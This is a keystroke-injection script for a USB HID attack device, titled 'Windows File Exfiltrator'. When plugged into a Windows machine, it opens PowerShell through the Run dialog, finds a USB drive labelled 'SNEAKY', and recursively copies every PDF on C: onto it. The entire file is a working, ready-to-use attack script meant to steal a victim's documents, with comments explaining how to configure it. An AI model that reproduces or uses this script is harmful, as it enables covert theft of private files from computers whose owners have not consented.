// Windows File Exfiltrator
// Author: Saytonic https://youtu.be/I_BjCdJlCo4
// Edited by: Coderdude112 on GitHub 
// For config help go to Saytonic's video found here: https://youtu.be/I_BjCdJlCo4
// This attack searches the SearchPath recursivly (All folders and sub-folders) for files that fit the FileTypes

layout('us');				// Set keyboard layout to US
var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack

function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
  delay(2000);				// Delay to make sure that File Explorer doesent take focus
  press("GUI r");			// Opens a run command
  delay(500);
  type("powershell\n");		// Opens powershell
  delay(1000);

  var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
  var SearchDrive = ["C:"] 	// The path to look for files NOTE: this will include ALL folders and sub-folders

  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); 												// Find the drive named "SNEAKY" and save it's path
  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 					// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
  type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); // Searches and copies the files in the SearchDrive

  type("exit\n");  			// Closes out 
}

function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
  while (Ready = "False") {
    press("SCROLL");
    result = waitLED(SCROLL,10);
    
    if (result.SCROLL) { 	// If this is true then the device is initalized. The loop will break and the attack will start
      Ready = "True";
      break;   
    } else {				// The device is not initalized so we will press scroll lock and retry
        press("SCROLL");
      }
    
  }
}

Initalized(); 				// Check if the host has initalized us
Attack();					// Run the attack
